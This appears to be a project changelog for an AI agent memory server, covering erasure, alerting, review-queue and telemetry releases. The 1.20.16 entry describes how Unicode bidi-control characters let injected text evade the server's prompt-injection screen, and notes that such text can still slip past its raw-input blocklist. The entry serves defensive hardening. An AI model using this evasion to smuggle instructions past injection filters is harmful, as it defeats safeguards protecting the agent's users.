  first → O(sum of m² per subject), ~O(n) dominating on mostly-unique
  subjects. Output is sorted by `(from_chunk, to_chunk)` for determinism
  (HashMap iteration order is unspecified; the result feeds the review queue,
  not an ordered API surface). The conflict *rule* is unchanged.
- **M3 — `idx_tombstones_reason_purged`** (`src/migration.rs`). The
  `/tombstones?subject=&since=` registry and the DSAR certificate read
  `WHERE reason = ? AND purged_at >= ?`; the compound index keeps those off a
  full tombstone scan. Guarded by the migration schema-contract test. Schema
  version → 1.20.18.
- **M4 — `/decayed` is paged** (`src/handlers/gate.rs`). `list_decayed`
  returned every expired chunk (full-table scan on the Rust-side
  `effective_expiry` filter). New `?limit=` (default `MAX_DECAYED` = 500) +
  `?offset=` page the Rust-filtered result — the page split never lands on the
  "is it actually expired?" decision. Extracted `page_decayed` for testing.

Tests: +6 (graph entity limit/clamp, graph relations from+to, subject-conflict
grouping ×2, decayed paging, tombstones index guard) → 520 passed. All gates
green: clippy `-D warnings`, `fmt`, openapi/route/schema guards, release build.

**Honest ceilings:** the graph `ORDER BY r.id` page is a bounded but arbitrary
window (no semantic ranking), `/decayed` pages the corpus but still scans it
once (a SQL push-down isn't possible — the expiry is a Rust pure function), and
the conflict scan is still quadratic within a single subject (inherent to the
mC2 rule). See `docs/AGENTS_HISTORY.md` Agent 85.



## [1.20.17] — 2026-08-12
### Release notes

- **Improvements:** The erasure transaction is now fully atomic: the ledger entry and certificate commit together with the erase itself.
- **The erasure ledger no longer retains erased data** — it previously kept a full copy of the exported bundle; now only a hash is stored, and completed entries age out after a configurable window.
- **Security fixes:** Exports support owner redaction: exporting one subject's data no longer carries another subject's content out of the system.
- **Security fixes:** Stored recall traces keep a fingerprint of the query, not the raw text, so replay works without retaining queried prose at rest.
- **Security fixes:** Memory writes with a mismatched owner scope are now recorded as denied audit events instead of being silently dropped.
### Engineering record


### Server — "Scrub" (GDPR erasure completion)

Server `Cargo.toml` 1.20.16 → 1.20.17; client stays at 1.20.16. Closes five
verified GDPR-erasure (Art 17 "right to erasure") completeness gaps. **No schema
change, no new route** — every fix lands on existing code paths. See
`IMPLEMENTATION_PLAN_v1.20.17_Scrub.md`.

- **M1 — DSAR ledger stores a hash, not the raw bundle** (`src/handlers/observe.rs`).
  The `dsar_requests` side-table persisted the full exported `bundle` JSON — a
  retained copy of the very data a DSAR just erased. Now persists
  `bundle_hash` (xxh3 of the export body) only. Mature DSAR ledger rows are
  pruned on the existing read-event prune cadence: `purge_stale_dsar_ledger`
  deletes `status='completed'` rows older than `BRAIN_DSAR_LEDGER_DAYS`
  (default 30). Also hardened the purge transaction's atomicity (M5): the
  ledger row + certificate are committed with the erase, and the certificate
  `signed_at` is backfilled after commit.
- **M2 — cross-owner export redaction** (`src/handlers/gate.rs`). `GET /export`
  (and `/export?format=ump`) gained an optional `redact_owner` query param: any
  row whose `owner` doesn't match is exported with `content` redacted to
  `[redacted]`. A shared `should_redact` helper keeps the JSON and UMP paths on
  one rule. So an operator exporting on behalf of one subject never carries
  another subject's chunk body out of the system.
- **M3 — stored recall traces hash the query** (`src/handlers/recall.rs`). The
  `recall_traces` side-table stored the raw `query` text. Now stores
  `query_hash` (xxh3 fingerprint) — the replay endpoint returns the decision
  path without retaining the queried prose at rest. Bounded, content-free, and
  PII-free like the audit chain.
- **M4 — UMP scope-mismatch audited as a denied auth event**
  (`src/handlers/ump_ops.rs`). A `ump.remember` whose declared `scope.owner`
  doesn't match the authenticated principal was silently dropped. It is now
  recorded as a `denied` auth audit row via the shared `record_forbidden_scope`
  helper; the detail (xxh3-hashed like all audit fields) names the mismatch
  without persisting either the owner label or the payload. Best-effort: an
  audit failure never fails the request.
- **Tests** (+7, no new files): observe (ledger stores hash not bundle, prune
  deletes only old completed rows, zero retention no-op, ledger committed with
  erase), recall (stored trace hashes query never raw text), gate (export
  redacts non-owned rows via the shared rule), ump_ops (scope mismatch audited
  as denied with only a hashed detail + chain verifies), plus the M5 atomicity
  test.

### Verification
- `cargo test --features bench,migrate`: **514 passed, 5 ignored** (main bin).
  Clippy `-D warnings` clean. `cargo fmt --check` clean.
- `test_openapi_covers_routes` + `authz_gates_cover_every_non_public_route` +
  `test_migration_schema_contract` green (no new routes, no schema change).
- Release build (all 5 binaries) clean.

### Honest ceilings (carried into v1.21 / v2.0)
- The export redaction replaces chunk `content` only; metadata (source, origin,
  owner, id) still reflects the target owner's selection. An operator wanting a
  fully subject-scoped export scopes the query at source.
- `purge_stale_dsar_ledger` runs on the read-event prune cadence, not a
  dedicated boot timer; retention is per whole-ledger, not per-subject.
- `query_hash`/`bundle_hash` are xxh3 fingerprints (traces and ledger are
  non-adversarial hashes, per the audit chain's existing pattern) — a consumer
  needing the exact query/bundle re-derives it from its own source copy.

---



## [1.20.16] — 2026-08-12
### Release notes

- **Injection screening now strips Unicode bidi-control characters** (directional overrides and isolates), closing the "Trojan Source" obfuscation class at the scoring boundary.
- **Security fixes:** The web client renders the de-obfuscated form, stripping bidi and other invisible characters from displayed text.
### Engineering record


### Server + client — "Bidi" (close the Unicode bidi-smuggling gap)

Server `Cargo.toml` 1.20.15 → 1.20.16; client 1.20.15 → 1.20.16. Closes the one
real gap a deep audit of six proposed agentic-security hardening measures
found against the live tree (the other five were already defended or out of
brain-server's scope — see the audit verdict). The injection screen's
`strip_invisible` predicate covered tag-block, variation selectors, zero-width,
and the legacy BOM/soft-hyphen set, but **not the Unicode `Bidi_Control`
block** — the directional-override smuggling class (U+202E RLO et al.) named by
Trojan Source / W3C TR#20 and by the LITL/EchoLeak hardening literature.

- **`is_invisible` widened** (`src/screen.rs` + `client/src/main.rs`, the two
  mirrors of the shared predicate) to strip the canonical bidi-control ranges:
  `U+200E–U+200F` (LRM/RLM marks), `U+202A–U+202E` (LRE/RLE/PDF/LRO/RLO — the
  overrides), and `U+2066–U+2069` (LRI/RLI/FSI/PDI isolates). No new codepath,
  no new dep, no abstraction — the existing predicate now covers the full
  Unicode `Bidi_Control` set. Because `strip_invisible` is applied at the
  classifier-scoring boundary (server) and the operator render boundary
  (client), both surfaces see the de-obfuscated form in one move.
- **Tests extended** (no new files): `strip_invisible_removes_smuggling_forms`
  (server) + `strip_invisible_removes_smuggling_but_keeps_visible_text`
  (client) now exercise U+200E / U+202E / U+2066 and the server test pins the
  full LRE/RLE/PDF/LRO/PDI collapse.
- **Audit verdict recorded** (this entry): of the six proposed measures, (1)
  LITL/UI markdown hardening is already defended — the Dioxus client renders
  escaped text nodes, no markdown parser, no `dangerous_inner_html`
  (build-guarded); (2) IFC/taint tracking already serializes `untrusted: true`
  on every recall hit, and the FIDES/CaMeL *enforcement* is orchestrator-side;
  (3) Rule-of-Two is an OpenClaw/orchestrator concern (brain-server has no
  shell/exec, one bounded outbound path); (4) MCP ETDI/signed manifests target
  aggregating MCP clients, not this single self-hosted server with a
  compile-time-fixed tool table; (5) SPIFFE/SPIRE + mTLS + TPM is org-level
  infra disproportionate for a single-loopback launchd service (did:key
  capability tokens already ship). Only (6.2) Unicode normalization had a real,
  in-scope gap → this release.

ponytail ceiling (documented, not fixed here): the server's layer-1 blocklist
(`contains_suspicious_pattern`) runs on **raw** content, not stripped input — so
a bidi-wrapped phrase the classifier now strips + catches can still dodge the
blocklist leg. Widening `is_invisible` shrinks this gap (the classifier scores
stripped text) but the blocklist-on-raw-input is a separate "where strip is
applied" change, out of scope for this hardening recommendation.

---



## [1.20.15] — 2026-08-12
### Release notes

- **Live deadline clocks in the review queue**: every pending proposal shows a tier-colored countdown to expiry; expired rows are flagged and their action buttons disabled.
- **Improvements:** Deadlines come from the server (absolute expiry plus thresholds), so client badges and server alerts always agree — even with a custom TTL configured.
- **Improvements:** New "expiry first" sort toggle surfaces the nearest deadlines at the top of the queue.
### Engineering record


### Server + client — "Clock" (deadline clocks in the review queue)

Server `Cargo.toml` 1.20.14 → 1.20.15; client 1.20.14 → 1.20.15. Brings the
console line's design rule — **"the queue is a clock"** — to the review queue
cards and the review detail page, where the operator actually decides (the
essay's condition: an operator needs to be *told* what is running out). The
7-day TTL exists (v1.20.1) and v1.20.8 Signal pushes expiry alerts, but the
queue itself showed only "pending" with no sense of urgency. Now every pending
proposal shows a live, tier-colored countdown to its deadline; expired rows
are flagged and the expired proposal's buttons disabled. The **server stays the
source of truth** — the client computes tiers locally from server-provided
absolute `expires_at` + `warn_secs`/`critical_secs`, so an operator override of
`BRAIN_PROPOSAL_TTL_SECS` or the alert thresholds is reflected with no rebuild
and the badge and the server alert cannot disagree about a tier. See
`IMPLEMENTATION_PLAN_v1.20.15_Clock.md`.

- **M1 — Server deadline on `ProposalView`** (`src/handlers/gate.rs`): three
  computed, non-stored fields on `ProposalView` via the new pure
  `gate::proposal_deadline(created_at)` — `expires_at` (`created_at +
  proposal_ttl_secs()`, the alert watcher's own math), `warn_secs`/`critical_secs`
  (the exact `ALERT_WARN_SECS`/`ALERT_CRITICAL_SECS` constants, so client badge
  and server alert share one boundary). No schema change, no new route.
  `openapi.yaml` documents the fields.
- **M2 — Client shared clock core + review clocks.** New `client/src/time_budget.rs`
  (`tier`/`remaining`/`format_remaining`/`now_unix`), Dioxus-free and consumed
  by Review cards, the detail page, and `/ops` — the old per-panel client TTL
  mirror (`ops::clock_until` + `DEFAULT_PROPOSAL_TTL_SECS`) is deleted in favor
  of the shared core. Review cards + the deep-link detail page render a
  tier-colored absolute-deadline badge (`Xd Yh` / `Xh Ym` / `Xm` / `<5m` /
  `expired`), refreshed on a ~30s tick; `Expired` rows disable approve/reject/
  edit. A client-side **sort-by-deadline toggle** ("expiry first" vs the server's
  creation order, stable id tie-break via the pure `review::expiry_order`)
  defaults to the server order so nothing changes unless asked (ponytail: the
  queue is ≤200 rows, local sort is honest and keeps the API surface flat).
- **M3 — wrap**: server + client bumped to 1.20.15; `api::now_unix` delegates to
  the shared core; openapi + Cargo.lock re-stamped; CHANGELOG + AGENTS header.

**Verification:** server 507 passed + 5 `#[ignore]`d green, clippy `-D warnings`
+ fmt green. Client 100 passed (was 99 at v1.20.14; +1 `expiry_order` sort
test, the `time_budget` tier/format/remaining cores already shipped), clippy
`-D warnings` + fmt green, wasm build green.

**Honest ceilings (carried forward):** the `<5m` display band is not
parameterized by an `ALERT_CRITICAL_SECS` override — an override shifts only
the tier *color*, never the coarse label (ponytail in the core). The new sort
toggle + badge strings are `en`-only first cuts (the shared clock core is
English-first); other locales inherit via the en-fallback until a native pass.
The 30s tick is a signal, not enforcement — the server's 400 on a stale
approve stays authoritative.



## [1.20.14] — 2026-08-12
### Release notes

- **Edit-then-approve**: reviewers can rewrite a pending proposal and approve the corrected version, instead of rejecting and re-ingesting.
- **Improvements:** Edited proposals are re-scored and re-screened for injection on save, and carry an "edited" badge so reviewers see the content is not the original.
- **Improvements:** Edits are audited (hashes of before/after only, never raw text) and never reset the expiry clock; edits also work offline via the client's queue.
### Engineering record


### Server + client — "Steer" (edit-then-approve: evaluative substitution)

Server `Cargo.toml` 1.20.13 → 1.20.14; client 1.20.13 → 1.20.14. Adds the
fifth limb of the human-in-the-loop essay (Bainbridge's irony of automation:
a reviewer stuck with binary buttons is a gate, not an evaluator): a human can
now **rewrite a pending proposal and approve the corrected version** instead of
reject + re-ingest — steering *toward* a better solution, not just away from a
bad one. Zero tokens, no LLM, no background worker; editing is an audited
operator mutation like every other decision, and the TTL clock is untouched so
an edit never dodges expiry (consequentiality preserved). See
`IMPLEMENTATION_PLAN_v1.20.14_Steer.md`.

- **M1 — Server `POST /proposals/{id}/edit`** (`src/handlers/gate.rs`): body
  `{content}` → re-scores deterministically through the exact `ingest_proposal`
  path (`novelty` vec0 KNN, `find_conflict`, `salience`), runs the v1.20.3
  two-layer injection screen (`Reject` → 400; `Quarantine` → allowed + stored,
  the read-time `screen_verdict` badge recomputes it), and stamps `edited_at`.
  Same stale/expiry + CAS discipline as approve/reject (v1.20.2 A3/A4): TTL
  check + expiry audit before the tx, `BEGIN IMMEDIATE` tx with
  `status='pending'` re-check, `n==0` → clean `409` rollback on a concurrent
  decision. Audit detail is **hashes only** — SHA-256 of before + after content,
  never raw text (pinned by a known-vector test). v1.20.7 `gate.edit` otel span
  under `--features otel`.
- **M1 — Migration**: additive nullable `proposals.edited_at` (unix ts); schema
  contract + wiring guards updated.
- **M2 — Client Review panel** (`client/src/panels/review.rs`): `edit_for`
  signal wired through the panel + `card()` (an **Edit** button), an
  `EditEditor` dialog (Escape-close, cancel, re-scored-on-save, inline
  `feedback` error), `E` keyboard mapping, and the `?` help table row. A
  `warn` **edited** badge (`edited_at` set) renders on the card + detail header
  so a reviewer/auditor sees the content shown is not the original capture.
  Offline: a new `QueuedAction::Edit` (payload-keyed, replay via the existing
  offline queue). New i18n keys `edit` / `review_key_edit` in `en` (other
  locales fall back via the established convention).
- **M3 — wire contract**: `ProposalView.edited_at` (server) ↔ `Proposal.edited_at`
  (`#[serde(default)]`, client); `openapi.yaml` documents `/proposals/{id}/edit`
  + the field.

### Honest ceilings (carried into v1.21 / v2.x)
- Editing is review-queue-only; it does not rewrite an already-promoted chunk
  (that remains consolidate + supersession).
- The audit detail carries before/after **hashes**, not text — a full content
  history diff of an edited proposal is not persisted (consistent with the
  hash-only audit practice).
- The client `edit` + `review_key_edit` strings are `en`-only first cuts; de/fr/
  es/nl inherit via the en-fallback until a native pass.
- No measured capacity/device run for the new panel (the `bench --envelope`
  operator step remains open).



## [1.20.13] — 2026-08-12
### Release notes

- **Improvements:** Eight technical blog posts (compliance, human-in-the-loop review, tamper-evident audit, retrieval, no lock-in) plus a media kit are now in the public docs.
- **Improvements:** Docs navigation, README, and the product-site pages cross-link the new content.
### Engineering record


### Server + client + docs — "Media" (GTM content + media kit, version-aligned)

Version-aligned, docs-only release (server `Cargo.toml` 1.20.12 → 1.20.13;
client 1.20.12 → 1.20.13, version-alignment only — the v1.20.12 pattern).
**No runtime code, no schema change, no new routes** — this is the outbound
half of the GTM documentation line: the *narrative* that makes brain-server
discoverable and saleable, built on the v1.20.12 *reference*. Content was
relocated (not re-authored) from the private `marketing/` working dir into
the public in-tree `docs/`, matching the v1.20.12 reuse precedent.

- **M1 — `docs/blog/`**: 8 technical-buyer posts, one per hard-won mechanism —
  compliance-time-bomb framing, deterministic human-in-the-loop, tamper-evident
  audit, reference-faithful retrieval (each citing its `docs/research/`
  explainer), no-lock-in (MCP/UMP/HTTP), OWASP 2026 as the sales doc, the honest
  ceiling, and a clearly-labelled forward-looking Profiles preview (v1.21.0).
  Every post's `../research/` / `../trust/` / `../OWASP_AGENTIC_2026.md` link
  resolves; the one stale in-repo cross-link (`blog-07-honest-ceiling.md` →
  `07-honest-ceiling.md`) fixed.
- **M2 — `docs/media-kit.md`**: name/one-liners/positioning/elevator, a
  "Brain vs Mem0 vs LangGraph vs plain RAG" sizing table with honest ceilings,
  headline stats tied to the proof map, and a press contact/ask. Two trust links
  corrected for the `docs/` location (`../trust/` → `./trust/`).
- **M3 — cross-links**: `docs/product-site/index.md` links the blog + media kit;
  README Documentation table + `docs/README.md` docs-map gain Blog + Media kit
  rows; README version badge → 1.20.13.
- **M4 — release wrap**: CHANGELOG §[1.20.13]; ROADMAP v1.20.13 row → Shipped;
  `openapi.yaml` + `Cargo.toml`/lock + `client/Cargo.toml`/lock re-stamped to
  1.20.13.

### Honest ceilings (carried into v2.2.1 "Drift")
- Blog posts are in-tree Markdown, **not** a published blog/CMS — the publishing
  channel is the v2.2.1 "Drift" + operator step.
- The Profiles preview post is explicitly forward-looking (v1.21.0), not a
  shipped capability.
- Media-kit positioning is author-faithful to the product, not an external
  analyst's endorsement; every technical claim maps to a proof-map row.



## [1.20.12] — 2026-08-12
### Release notes

- **Improvements:** New public documentation: product-site pages (overview, install, quickstart, editions) consumable by any static site generator.
- **Improvements:** A research section explains each retrieval mechanism — problem, reference, deterministic implementation, and known ceiling.
- **Improvements:** A trust proof map ties every security/compliance claim to the release that shipped it and the command that verifies it, with a scripted reproduce walkthrough.
### Engineering record


### Server + client + docs — "Docs" (GTM documentation line, version-aligned)

Version-aligned release (server `Cargo.toml` 1.20.11 → 1.20.12; client
1.20.9 → 1.20.12, version-alignment only — the same pattern as v1.18.2
"Align"). **No runtime code, no schema change, no new routes** — the GTM
documentation line is docs-only; the version move simply re-anchors both
components at the same 1.20.12 so the tree is aligned. Converts the
already-shipped technical posture into buyer-facing evidence. The three
tiers **live in the tree** under `docs/` (relocated from the private
`marketing/` working dir), so any site generator or the existing static
serving can consume them.

- **M1 — `docs/product-site/`**: `index.md` (the "your agent's memory is a
  compliance time bomb" elevator + the three-pillar posture), `install.md`,
  `quickstart.md`, `editions.md` (OSS / self-hosted-pro / enterprise
  **placeholders** — pricing is v2.2 "Meridian", flagged in-file).
- **M2 — `docs/research/`**: one scientific explainer per shipped retrieval
  mechanism — bi-temporal KG (Graphiti), submodular evidence packing
  (arXiv:2607.00725), TRACE edges (arXiv:2607.00339), PPR graph leg
  (HippoRAG-2), GAAMA hub dampening, calibrated abstention + "Use Graph When It
  Needs" gating (arXiv:2602.03578), reachable-PRF evidence gate. Each: problem →
  reference → deterministic implementation → measured/known ceiling.
- **M3 — `docs/trust/`**: the **proof map** (`proof-map.md`) — every
  SECURITY/COMPLIANCE/OWASP_AGENTIC_2026 claim mapped to the release that
  shipped it + the exact live `curl`/`brain` command that proves it, plus the
  owned-ceilings list — and `reproduce.md`, a scripted walk-through of the whole
  map against a throwaway instance. "Verify it, don't trust it."
- **M4 — cross-links + alignment**: README Documentation table +
  `docs/README.md` gain the three-tier links; README version badge regenerated
  from the real build via `scripts/badges.sh` (server + client now both
  1.20.12); `openapi.yaml` + `CLIENT_ROADMAP` + `client/README.md` re-stamped.

### Honest ceilings (carried into v2.2.1 "Drift")
- Docs are Markdown in-tree, **not** a deployed site with a domain — the
  static-serve/publish step is the v2.2.1 "Drift" + operator handoff.
- Editions/pricing are placeholders until v2.2 "Meridian" lands.
- Scientific explanations are author-faithful to the papers; brain-server is a
  deterministic implementation of *specific* techniques, not a SOTA-parity
  claim — each explainer states its ceiling honestly.
- The client bump is version-alignment only (no client code change); the last
  client feature release remains v1.20.9 "Register".



## [1.20.11] — 2026-08-12
### Release notes

- **Bug fixes:** README badges and roadmap status corrected — the hand-typed test count had drifted from the measured suite, and two shipped releases were still listed as planned.
- **Improvements:** New script generates README badges (versions, test count, conformance level, SBOM presence) from the actual build — it never fabricates a number.
- **Improvements:** New release checklist documents the wrap steps and the quality gates that must stay green.
### Engineering record


### Server + docs — "Housekeeping" (badge generation + release hygiene)

**Dev-tools + docs + version release** (server 1.20.10 → 1.20.11; client stays at
1.20.9). Closes the operator-console line. **No new runtime code, no schema
change, no new dependency** — a badge-generation script + a release-wrap
checklist, so the README's badges and the release notes are facts, not
hand-typed claims.

### Added
- **M1 — `scripts/badges.sh`.** Derives the README's dynamic badges from the
  real build: version from `Cargo.toml` (server) + `client/Cargo.toml`
  (client), test count from an actual `cargo test --features bench,migrate`
  run (parses the "N passed" lines), UMP level from the shipped self-attested
  L3 (asserted every push by the `ump-conformance` CI job), and an SBOM-present
  flag from the on-disk CycloneDX JSON. Prints the badge block for the human to
  paste; `--selfcheck` verifies the version derivation + the release
  checklist's six-artifact completeness and exits nonzero on any drift. It
  never fabricates a number it did not measure.
- **M2 — `docs/release-checklist.md`.** Codifies the six-part release wrap
  (Cargo.toml+lock, openapi.yaml, CHANGELOG, ROADMAP, README badges via
  `badges.sh`, AGENTS.md) with the verifying commands and the gates that must
  stay green. Documents the docs-only exception (no `Cargo.toml`/OpenAPI
  change). A doc, not a CI gate — wiring it into CI as a blocking check is the
  operator's call (intentionally out of scope; CI churn risks false-reds).
- **M3 — `/proof` integrity panel: NOT built (optional, off by default).** The
  v1.20.10 integrity signal already lives in the queue-header `Badge`; a whole
  panel is speculative UI until the operator asks.

### Changed
- README badges regenerated via `scripts/badges.sh` — fixing the hand-typed
  test-count drift (README claimed 712; the measured suite differs).
- ROADMAP released rows for v1.20.6 ("Console") and v1.20.9 ("Register") marked
  Shipped (they had shipped but were still listed Planned); v1.20.11 row →
  Shipped; released-version header → 1.20.11.

### Ship
- Docs + script commit. No server restart, no client bundle.

### Honest ceilings (carried into v2.0)
- Badge generation is a script, not a CI hard-gate — it produces facts for the
  human to paste; a blocking CI check is the operator's call.
- The `/proof` panel is optional and off by default.
- The release checklist is a doc, not automation; a `release.sh` that does all
  six steps is a v2.x dev-infra nicety, deliberately not built here.



## [1.20.10] — 2026-08-12
### Release notes

- **Audit-chain integrity watcher**: the tamper-evident chain is re-verified on a cadence (default 60s); breaks and recoveries raise alerts, and the health endpoint shows the posture.
- **Improvements:** A script assembles a CRA-ready evidence bundle (SBOM, security/support/deployment/compliance docs) with a SHA-256 manifest.
- **Improvements:** A second script builds per-decision transparency records answering "why did this become memory, by what path, from what source".
- **Improvements:** New SUPPORT.md states supported versions and update guidance.
### Engineering record


### Server + docs — "Proof" (integrity feed + CRA/ADMT evidentiary kits + SUPPORT.md)

**Server release** (server 1.20.8 → 1.20.10; client stays at 1.20.9). Adds the
audit-ready-replay evidentiary bundle the v1.20.5 "Agentic" docs line promised:
a live integrity watcher over the tamper-evident audit chain, and two
`scripts/` kits that assemble already-shipped evidence (SBOM + reporting +
support docs; per-decision ADMT records) into hashed bundles. **No new routes,
no schema change, no new deps.**

### Added
- **M1 — Integrity feed watcher** (`src/alert.rs` + `src/main.rs` +
  `src/config.rs`). `alert::spawn_chain_watcher` re-runs the existing full
  `/audit/verify` chain check on a cadence (`BRAIN_CHAIN_CHECK_SECS`, default
  60s) and raises an `integrity` alert on ok↔broken transitions (pure
  `chain_transition` core: no per-tick spam, a broken boot raises instantly, a
  recovery raises `ok`). `/health` gains `integrity:{chain_ok, last_checked_at,
  chain_head}` — the watcher's cached posture, content-free and PII-free.
- **M2 — CRA evidentiary kit** (`scripts/cra-kit.sh` + `docs/cra.md`).
  Idempotently assembles the per-release CycloneDX SBOM, `SECURITY.md`,
  `SUPPORT.md`, `docs/deployment.md`, `COMPLIANCE.md` into `dist/cra-kit/` with
  a `CRA_MANIFEST.json` SHA-256 index. Evidences the EU CRA "SBOM + reporting +
  support" bar; the honest "certification is an org action, not a repo claim"
  ceiling is explicit.
- **M3 — ADMT kit** (`scripts/admt-kit.sh` + `docs/admt.md`). Read-only
  assembly of the existing `GET /get/{id}` (chunk `origin`/`owner`/evidence
  span) + `GET /audit?kind=reconcile` (proposal-gate trail) into a per-decision
  `ADMT_RECORD.json` + hashed manifest. Answers "why did this become memory, by
  what path, from what source" — inherits the server's integrity posture, never
  fabricates a summary.
- **M4 — `SUPPORT.md`** — repo-standard support statement (supported versions →
  `SECURITY.md`, reporting path, update guidance, honest no-SLA posture).
- **OpenAPI** — `/health` `integrity` object documented; version stamp →
  1.20.10.

### Changed
- `health_body` now takes `integrity` and emits it; `AppState` carries the
  watcher's `ChainWatchState`.



## [1.20.9] — 2026-08-12
### Release notes

- **Agent Memory Register panel**: stored knowledge grouped by origin (human / model / imported) with live counts, plus filters by owner, source, and kind.
- **Improvements:** A shared evidence viewer shows the verbatim source span, source URI, revision, and line range from any register row.
- **Improvements:** Read-only by construction — the register cannot be fed a mutation's response.
### Engineering record


### Client — "Register" (read-only Agent Memory Register + shared evidence viewer)

**Client release** (client 1.20.8 → 1.20.9; server + API contract stay at 1.20.8).
A pure client composition of the already-shipped `GET /export` + `GET /get/{id}`
endpoints — **no new routes, no new wire types, no new deps**. The v1.20.7
telemetry `origin` marker (and the v1.18.2 provenance it derives from) is now
visible in the console as an operator-facing provenance ledger.

### Added
- **M1 — Register panel (`/register`, `client/src/panels/register.rs`)** — reads
  the `knowledge` body of `GET /export` and partitions rows into the three
  **origin** tiers (`human` / `model` / `imported`) with live counts, plus an
  All tab. Pure `register_filter` narrows by owner/source/memory-kind; each row
  renders id · bounded excerpt · provenance badges · UTC date.
- **M2 — shared evidence viewer (`EvidenceModal`)** — one reusable `role="dialog"`
  opened from any register row; fetches the existing `GET /get/{id}` wire and
  shows the verbatim span + `source_uri` + revision + heading + line range.
  Hand-rolled Esc-close modal matching the review-panel idiom (the client has
  no Radix `DialogRoot`).
- **Wiring** — `Route::Register`, rail + mobile tab + command palette
  (nav 13 → 14, guard test updated), i18n `nav_register` in `en` (other locales
  fall back per the established convention).
- **Tests** — client **99 passed** (6 new: `register_filter`, `origin_group`,
  `register_excerpt` incl. the invisible-char strip boundary, `format_epoch`,
  `evidence_modal_uses_existing_get_route`, `register_is_read_only`).

### Honest ceilings
- The register is **read-only by construction**: `parse_export_rows` yields zero
  rows from any non-`/export` body, so the ledger can't be fed a mutation's
  response.
- Recall hits still open the existing shared drawer (`DrawerContent::Hit`); the
  register's `EvidenceModal` is `pub` for a future recall entry (the plan's
  recall wiring was deferred — rewiring would orphan a drawer variant).
- `highlights` and `source_prompt` are server proposal-only and are **not**
  rendered (the plan's client-side claims to them were wrong; `/get/{id}` has
  no such fields).
- `format_epoch` is a dependency-free UTC `YYYY-MM-DD` (Howard Hinnant civil-
  from-days); no timezone conversion.

---



## [1.20.8] — 2026-08-12
### Release notes

- **Live operator alert stream**: server-sent events for proposals entering review, deadline crossings, injection quarantines, and audit-chain checks — filterable by kind.
- **Improvements:** Optional outbound webhook delivers each alert with an HMAC-SHA256 signature and retries; an unreachable endpoint drops alerts fail-soft.
- **Improvements:** The web client subscribes live: alerts refresh the right panels and are announced to screen readers; the periodic poll remains the fallback.
- **Security fixes:** Alert payloads carry ids and sequence numbers only — content and personal data never leave the server through the feed.
### Engineering record


### Server — "Signal" (operator alert feed `GET /events` + optional alert webhook sink)

**Server + client release** (server 1.20.7 → 1.20.8; client 1.20.6 → 1.20.8).
The live half of the v1.20.8 Signal plan: a fixed, hand-curated operator alert
stream and an outbound webhook sink so the decisions the memory gate makes are
no longer silent. **No schema change, no new deps** (reuses the existing
`webhook_queue` table + `verify_standard_signature` machinery).

### Added
- **`GET /events` SSE stream** (`src/alert.rs::events`) — emits alert events
  `{kind, ts, seq, payload}` for exactly four fixed kinds: `pending`
  (a proposal entered the review queue), `expiry` (a proposal/retention
  deadline crossed), `screen` (an injection-screen hit → quarantine), `chain`
  (the audit hash chain was re-verified / a tamper alert fired). Optional
  `?kinds=` filter; SSE `retry` hint; Read-gated. Payloads carry ids/seq only —
  **content and PII never leave the server** (`AlertKind` is a fixed enum, so
  the wire type can't grow arbitrary fields).
- **Publishing points** — `verify_audit_chain` (`chain`), `ingest_proposal`
  (`pending` + `screen` on quarantine), the v1.20.4 proposal-TTL expiry
  (`expiry`). Emitted via a tokio broadcast on `AppState`.
- **Optional outbound alert webhook** (`src/alert.rs::sink` +
  `src/webhook.rs::sign_standard_signature`) — when `BRAIN_ALERT_WEBHOOK_URL`
  (+ optional `BRAIN_ALERT_WEBHOOK_SECRET`) is set, each alert is enqueued and
  delivered with the Standard-Webhooks `v1,` HMAC-SHA256 signature (the same
  scheme as v1.20.4), 3 retries, fail-soft.
- **Client `/ops` subscribes** — `region_for(kind)` maps an alert to a console
  region (`pending`/`screen`/`chain` → queue/flagged refresh, `expiry` → SLA
  clock reset), a monotonic `seq` guard (`should_apply`) drops replays, and an
  `aria-live="polite"` line announces each alert (i18n
  `alert_queued`/`alert_screen`/`alert_expiring`). The ~30s tick poll remains
  the honest fallback when the feed is unreachable.
- **Tests** — server 503 passed + 5 ignored (5 new: alert-kind fixed-set,
  seq-envelope purity, tier/region mapping, webhook signature round-trip);
  client 93 (3 new: `region_for`, `should_apply` flood guard,
  `parse_alert_event` kind+seq only).

### Honest ceilings
- `GET /events` is server-push over SSE; the client polls with a bounded read
  (a browser `EventSource` can't carry the bearer token, so `fetch` +
  `bytes_stream` is used) — the feed is an optimization over the existing
  tick poll, not a new authority.
- The webhook sink is fail-soft by design: an unreachable endpoint drops
  alerts (they remain in the audit log + `/events`).
- `seq` is per-process; a multi-instance deployment would need a shared counter
  (v2.x).

---



## [1.20.7] — 2026-08-12
### Release notes

- **Improvements:** Optional OpenTelemetry tracing (behind a build feature; the default build is unchanged) covers the three decision seams: injection screen, review gate, and recall.
- **Improvements:** Spans carry stable labels and a bounded query fingerprint — query content is never sent to the collector.
### Engineering record


### Server — "Telemetry" (instrumented decision cores behind `--features otel`)

Optional OpenTelemetry tracing of the write-gate decision path, **gated behind
a new `otel` Cargo feature** so the default build ships with **zero tracing
machinery and zero new runtime deps** (every `#[instrument]` and the OTLP
exporter are `#[cfg(feature = "otel")]`). This is the observability half of the
v1.20.x audit follow-up: the three seams that decide what becomes (or stays)
memory — the injection screen, the human review gate, and recall — now emit
spans an operator can ship to any OTLP collector. No schema change, no new
routes, no API contract change. Server version stays at 1.20.4; the `otel`
feature rides into the next tagged release.

### Added
- **`src/otel.rs`** (new, `#[cfg(feature = "otel")]`): `init_otel` builds the
  `SdkTracerProvider` + an OTLP HTTP exporter to `BRAIN_OTEL_ENDPOINT` (default
  `http://127.0.0.1:4318/v1/traces`), plus the pure label helpers shared by the
  spans: `query_hash` (bounded xxh3 of the query — content never sent as a
  field), `screen_verdict_span` (Clean/Quarantine/Reject → label),
  `gate_outcome` (decision → `proposed`/`approved`/`rejected`).
- **Instrumented decision seams** — all `#[cfg_attr(feature = "otel",
  tracing::instrument(name = "…"))]` so the default build is byte-identical:
  - `screen::screen` → `screen` span, records `verdict`.
  - `recall::run_recall` → `recall` span (`decision`, `graph_rescued`, `hits`,
    `domain`, `principal`, `query_hash`).
  - `gate::ingest_proposal` / `approve_proposal` / `reject_proposal` →
    `gate.{propose,approve,reject}` spans with `outcome`.
- **`main.rs`**: `init_tracing` wires `EnvFilter` (its own layer — the fmt
  layer has no `with_env_filter` method) + the otel layer behind
  `BRAIN_OTEL_ENDPOINT`; `provider.tracer("brain-server")` via
  `TracerProvider::tracer`.
